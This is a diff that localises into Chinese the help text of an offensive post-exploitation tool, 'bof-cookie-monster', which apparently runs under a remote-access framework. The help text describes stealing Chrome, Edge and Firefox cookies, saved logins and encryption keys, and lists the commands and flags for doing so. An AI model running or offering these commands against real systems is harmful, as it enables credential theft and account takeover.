@@ -1,13 +1,13 @@
-ABOUT
+关于
     Steals browser cookies and logins for Chrome, Edge, and Firefox.
     Extracts WebKit master key and App Bound encryption key, duplicates
     handles to Cookies and Login Data files for fileless download. Supports
     SYSTEM mode key decryption without browser injection. Use decrypt.py
     offline to decrypt downloaded databases.
-USAGE:
+用法：
     bof-cookie-monster --- <mode> [options]
 
-EXAMPLES:
+示例：
     bof-cookie-monster --- --chrome
     bof-cookie-monster --- --edge
     bof-cookie-monster --- --firefox
@@ -21,7 +21,7 @@ EXAMPLES:
     bof-cookie-monster --- --chrome --login-data-only
     bof-cookie-monster --- --chrome --copy-file "C:\Folder\Location"
 
-MODES:
+模式：
     --chrome                Scan chrome.exe processes and duplicate Cookies handle
     --edge                  Scan msedge.exe processes and duplicate Cookies handle
     --firefox               Parse profiles.ini and download key4.db and logins.json
@@ -31,15 +31,15 @@ MODES:
     --edgeCookiePID         Target specific Edge PID with Cookies handle
     --edgeLoginDataPID      Target specific Edge PID with Login Data handle
 
-OPTIONS:
+选项：
     --key-only              Only retrieve app bound encryption key
     --cookie-only           Only retrieve Cookies file
     --login-data-only       Only retrieve Login Data file
     --copy-file             Copy files to specified folder instead of fileless retrieval
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     bof-cookie-monster -w 60 --- --chrome
